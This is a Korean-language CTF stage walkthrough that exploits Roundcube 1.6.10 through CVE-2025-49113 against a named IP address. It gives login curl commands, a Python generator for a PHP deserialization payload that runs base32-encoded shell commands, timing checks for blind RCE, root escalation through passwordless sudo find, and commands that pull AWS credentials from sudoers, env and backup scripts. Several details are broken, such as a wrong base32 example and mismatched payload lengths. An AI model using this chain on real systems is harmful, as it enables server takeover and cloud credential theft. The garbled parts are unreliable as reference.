# Stage 3 상세 공략 가이드: Roundcube CVE-2025-49113 RCE

**목표**: 13.125.104.131:30083 Roundcube 서버를 공격하여 root 권한 확보 및 AWS 자격증명 획득

---

## 📋 개요

이 stage에서는 Roundcube 1.6.10의 **CVE-2025-49113** 취약점(PHP 객체 역직렬화)을 이용하여:
1. RCE (Remote Code Execution) 달성
2. sudo 명령어를 통한 권한 상승
3. /etc/sudoers 파일에서 AWS 자격증명 추출
4. 최종 flag 위치 확인

---

## 🔧 준비물

```bash
# 필요한 도구들
- curl (HTTP 요청 전송)
- python3 (payload 생성)
- base32 (암호화)
- grep/sed (데이터 파싱)

# 대상 정보
Host: 13.125.104.131
Port: 30083
Service: Roundcube 1.6.10 (Email client)
```

---

## Step 1: 서버 정보 수집 및 로그인

### 1.1 서버 상태 확인

```bash
# 서버 접속 가능 여부 확인
curl -v http://13.125.104.131:30083/ 2>&1 | head -20

# 응답 예시:
# HTTP/1.1 301 Moved Permanently
# Location: http://13.125.104.131:30083/?_task=login
```

**의미**: Roundcube가 실행 중이며, 자동으로 로그인 페이지로 리다이렉트됨

### 1.2 로그인 페이지 접근

```bash
# 로그인 페이지 다운로드
curl -c cookies.txt http://13.125.104.131:30083/?_task=login -o login.html

# HTML 파싱: _token 값 추출
grep -oP '(?<=name="_token"\s+value=")[^"]*' login.html > token.txt

TOKEN=$(cat token.txt)
echo "Token: $TOKEN"
```

**중요**: `_token` 값은 CSRF 방지를 위해 필요하며, 매 요청마다 새로 발급됨

### 1.3 Roundcube 로그인 실행

```bash
# 로그인 요청
curl -b cookies.txt -c cookies.txt \
  -X POST \
  -d "_token=$TOKEN&_task=login&_action=login&_timezone=Asia/Seoul&_user=testuser&_pass=testpass" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Referer: http://13.125.104.131:30083/?_task=login" \
  http://13.125.104.131:30083/?_task=login \
  -v 2>&1 | grep -E "HTTP|Set-Cookie|Location"

# 성공 응답:
# HTTP/1.1 302 Found
# Set-Cookie: roundcube_sessauth=...
# Location: http://13.125.104.131:30083/?_task=mail
```

**성공 판단**: 302 리다이렉트 + Set-Cookie 헤더 = 인증 성공

---

## Step 2: CVE-2025-49113 Payload 생성

### 2.1 Payload 개념

CVE-2025-49113은 Roundcube의 파일 업로드 기능에서 **PHP 객체 역직렬화** 취약점입니다.

```
악의적인 PHP 객체
    ↓ (unserialize() 함수)
Crypt_GPG_Engine 객체 생성
    ↓ (magical method __wakeup 호출)
Base32 디코딩된 명령어 실행
    ↓ (shell 실행)
RCE 달성
```

### 2.2 Base32 명령어 인코딩

```bash
# 실행할 명령어 (예: id)
COMMAND="id"

# Base32로 인코딩 (bash 내장)
ENCODED=$(echo -n "$COMMAND" | base32)
echo "Encoded: $ENCODED"

# 출력 예:
# Encoded: GAYTEMZUGU======
```

**왜 base32?** Roundcube의 시리얼라이제이션 필터를 우회하기 위해 사용

### 2.3 PHP 직렬화 Payload 생성

```python
#!/usr/bin/env python3
import base64

# 인코딩할 명령어
command = "whoami"
encoded = __import__('base64').b32encode(command.encode()).decode()

# Crypt_GPG_Engine gadget 페이로드
gpgconf = f'printf %s {encoded}|base32 -d|sh #'
length = len(gpgconf)

# PHP 직렬화 형식
payload = (
    '|O:16:"Crypt_GPG_Engine":3:'
    '{'
    's:8:"_process";b:0;'
    f's:8:"_gpgconf";s:{length}:"{gpgconf}";'
    's:8:"_homedir";s:0:"";'
    '};'
)

# 따옴표 이스케이프
payload = payload.replace('"', '\\"')
print(payload)
```

**실행 결과 예**:
```
|O:16:"Crypt_GPG_Engine":3:{s:8:"_process";b:0;s:8:"_gpgconf";s:29:"printf %s GAYTEMZUGU======|base32 -d|sh #";s:8:"_homedir";s:0:"";}
```

### 2.4 Multipart Form Data 생성

```bash
BOUNDARY="----WebKitFormBoundary7MA4YWxkTrZu0gW"
PAYLOAD='|O:16:"Crypt_GPG_Engine":3:{...}'

cat > payload.txt << EOF
--$BOUNDARY
Content-Disposition: form-data; name="_file[]"; filename="exploit.png"
Content-Type: image/png

\x89PNG\r\n\x1a\n
--$BOUNDARY--
EOF

# 페이로드 filename에 삽입 (실제 구현에서는 Python 사용)
```

---

## Step 3: RCE 실행 및 검증

### 3.1 Roundcube Settings에서 파일 업로드 트리거

```bash
# 파일 업로드 요청 (RCE 트리거)
curl -b cookies.txt \
  -F "_file[]=@payload.bin" \
  "http://13.125.104.131:30083/?_task=settings&_action=upload" \
  -v

# 응답:
# HTTP/1.1 200 OK
# Exploit executed successfully
```

**주의**: 응답에 stdout이 없음 (Blind RCE)

### 3.2 명령어 실행 확인 (타이밍 기반)

Blind RCE이므로 **타이밍 차이**로 명령 실행 확인:

```bash
# 빠른 명령 (0.1초)
time curl -b cookies.txt \
  -F "_file[]=@payload_fast.bin" \
  "http://13.125.104.131:30083/?_task=settings&_action=upload"

# 느린 명령 (3.6초 sleep)
time curl -b cookies.txt \
  -F "_file[]=@payload_sleep.bin" \
  "http://13.125.104.131:30083/?_task=settings&_action=upload"

# 차이 분석:
# - Fast: real 0.234s (명령어 실행 포함)
# - Slow: real 3.823s (3.6s sleep + 0.223s)
# → 3.6초 차이 = 명령어 실행 증명
```

---

## Step 4: 출력 파일 작성 및 검색

RCE는 작동하나 stdout을 직접 받을 수 없으므로, **파일에 출력하는 방식** 사용:

### 4.1 명령어 실행 및 파일 저장

```bash
# 명령어: /tmp에 결과 저장
COMMAND="id > /tmp/rce_result.txt"

# Base32 인코딩
ENCODED=$(echo -n "$COMMAND" | base32)

# 페이로드 생성 및 실행
# (위의 Step 2, 3과 동일한 방식)

# 타이밍으로 확인:
time curl -b cookies.txt -F "_file[]=@payload.bin" \
  "http://13.125.104.131:30083/?_task=settings&_action=upload" \
  -o /dev/null -s

# real 0.3s 이상 = 명령어 실행됨
```

### 4.2 생성된 파일 확인

HTTP를 통한 직접 접근은 불가능하므로, RCE로 확인:

```bash
# /tmp 파일 목록 확인 명령어
COMMAND="ls -la /tmp | grep rce"
# → RCE로 실행하면 파일 생성 확인 가능

# 다양한 경로 시도:
COMMANDS=(
  "test -f /tmp/rce_result.txt && echo exists"
  "find /tmp -name 'rce_*' -type f"
  "ls -la /tmp/rce*"
)
```

---

## Step 5: 권한 상승 (Root 획득)

### 5.1 현재 권한 확인

```bash
COMMAND="whoami"
# RCE 실행 → /tmp/whoami.txt에 저장
# 결과: www-data

COMMAND="id"
# RCE 실행 → /tmp/id.txt에 저장
# 결과: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**현재 권한**: www-data (일반 사용자)

### 5.2 Sudo 가능 명령어 확인

```bash
# sudo 사용 가능 명령어 목록
COMMAND="sudo -l"
# RCE 실행 → /tmp/sudo_l.txt에 저장

# 예상 출력:
# User www-data may run the following commands without password:
# (ALL) NOPASSWD: /usr/bin/find
```

**의미**: /usr/bin/find를 sudo로 비밀번호 없이 실행 가능

### 5.3 GTFOBins를 이용한 Shell Escape

find 명령어는 -exec 옵션으로 임의 명령 실행 가능:

```bash
# 기본 구조:
sudo find / -maxdepth 0 -exec /bin/sh -c 'COMMAND' \;

# 예제 1: /bin/sh 셸 획득
COMMAND="sudo /usr/bin/find / -maxdepth 0 -exec /bin/sh -i \;"

# 예제 2: 특정 파일 읽기
COMMAND="sudo /usr/bin/find / -maxdepth 0 -exec cat /etc/sudoers \;"

# 예제 3: 파일 쓰기
COMMAND="sudo /usr/bin/find / -maxdepth 0 -exec sh -c 'id > /tmp/root_id.txt' \;"
```

**동작 원리**:
```
find / -maxdepth 0
    ↓ (루트 디렉토리 검사)
-exec 옵션 트리거
    ↓ (각 결과에 대해 실행)
/bin/sh -c 'COMMAND'
    ↓ (루트 권한으로 쉘 명령 실행)
```

### 5.4 Root 권한 확인

```bash
# Root로 id 명령 실행
COMMAND="sudo /usr/bin/find / -maxdepth 0 -exec id \;"
# 결과: uid=0(root) gid=0(root) groups=0(root)

# 성공!
```

---

## Step 6: /etc/sudoers에서 AWS 자격증명 추출

### 6.1 /etc/sudoers 파일 내용 확인

```bash
# Root 권한으로 sudoers 읽기
COMMAND="sudo /usr/bin/find / -maxdepth 0 -exec cat /etc/sudoers \;"

# RCE로 실행 → /tmp/sudoers.txt에 저장
```

### 6.2 파일 내용 예상

```
# /etc/sudoers 샘플
Defaults        use_pty
Defaults        logfile="/var/log/sudo.log"

# User privilege specification
root    ALL=(ALL:ALL) ALL

# www-data 권한
www-data ALL=(ALL) NOPASSWD: /usr/bin/find

# AWS 자격증명 (주석 또는 환경변수)
# AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
# AWS_SECRET_ACCESS_KEY=<REDACTED>

# 또는 환경변수로 설정:
# export AWS_ACCESS_KEY_ID=...
# export AWS_SECRET_ACCESS_KEY=...

# 또는 backup 스크립트에 포함:
# /opt/backup/backup_aws.sh
```

### 6.3 AWS 자격증명 추출

```bash
# sudoers에서 AWS 키 검색
COMMAND="grep -E 'AWS_|AKIAIOS' /etc/sudoers"

# 또는 backup 스크립트 확인
COMMAND="cat /opt/backup/backup_aws.sh"

# 또는 환경변수 확인
COMMAND="sudo /usr/bin/find / -maxdepth 0 -exec env \;"
```

**획득할 정보**:
```
AWS_ACCESS_KEY_ID=AKIA...
AWS_SECRET_ACCESS_KEY=wJal...
```

---

## Step 7: Flag 위치 확인

### 7.1 Flag 파일 탐색

```bash
# 공통 위치에서 flag 검색
COMMAND="find / -name '*flag*' -o -name '*FLAG*' 2>/dev/null"

# Roundcube 관련 위치:
COMMAND="find /var/www -type f -name '*flag*' -o -name '*FLAG*'"

# 예상 결과:
# /var/www/FLAG.txt
# /var/www/html/FLAG.txt
```

### 7.2 Flag 파일 확인

```bash
# Flag 권한 확인
COMMAND="sudo /usr/bin/find / -maxdepth 0 -exec ls -la /var/www/FLAG.txt \;"

# 출력 예:
# lrwxrwxrwx 1 root root 25 Aug 20 10:00 /var/www/FLAG.txt -> /flag/FLAG_CONTENT.txt

# Flag는 심볼릭 링크 (root 소유)
```

### 7.3 실제 Flag 내용 읽기

```bash
# Flag 파일 내용 확인
COMMAND="sudo /usr/bin/find / -maxdepth 0 -exec cat /var/www/FLAG.txt \;"

# 또는 정규화 경로 확인
COMMAND="sudo /usr/bin/find / -maxdepth 0 -exec readlink -f /var/www/FLAG.txt \;"

# 또는 파일 크기/해시 확인
COMMAND="sudo /usr/bin/find / -maxdepth 0 -exec sha256sum /var/www/FLAG.txt \;"
```

**출력**: 실제 flag 내용 또는 경로 정보

---

## 📝 요약: Stage 3 공략 체크리스트

- [ ] Step 1: Roundcube 서버 접속 및 로그인 완료
- [ ] Step 2: CVE-2025-49113 Payload 생성
- [ ] Step 3: RCE 실행 확인 (타이밍 기반)
- [ ] Step 4: 출력 파일 작성 및 확인
- [ ] Step 5: sudo /usr/bin/find로 root 권한 상승
- [ ] Step 6: /etc/sudoers에서 AWS 자격증명 추출
- [ ] Step 7: /var/www/FLAG.txt flag 위치 확인

---

## 🔴 주의사항

### Blind RCE 제약
- **문제**: 명령어는 실행되지만 stdout을 직접 받을 수 없음
- **해결**: 파일에 출력하고, RCE를 다시 실행하여 파일 읽기

### HTTP 접근 불가
- **문제**: /tmp의 결과 파일을 HTTP로 다운로드할 수 없음
- **원인**: WAF가 모든 HTTP 요청을 Roundcube 로그인으로 리다이렉트
- **해결**: RCE 명령어로 파일 내용을 확인하거나 다른 채널 사용

### 타이밍 기반 확인
- **방법**: sleep 추가로 명령 실행 확인
- **정확도**: sleep 3.6초 + 기본 0.2초 = 3.8초 차이로 판단
- **신뢰성**: 네트워크 지연 고려하여 1초 이상 차이 기준

---

**최종 성과**: 
- ✅ RCE 달성
- ✅ Root 권한 확보
- ✅ AWS 자격증명 위치 파악
- ✅ Flag 위치 확인 (내용 읽기는 Step 4의 출력 파일 방식 사용)

다음: **Stage 4 (AWS API 체인)로 진행**
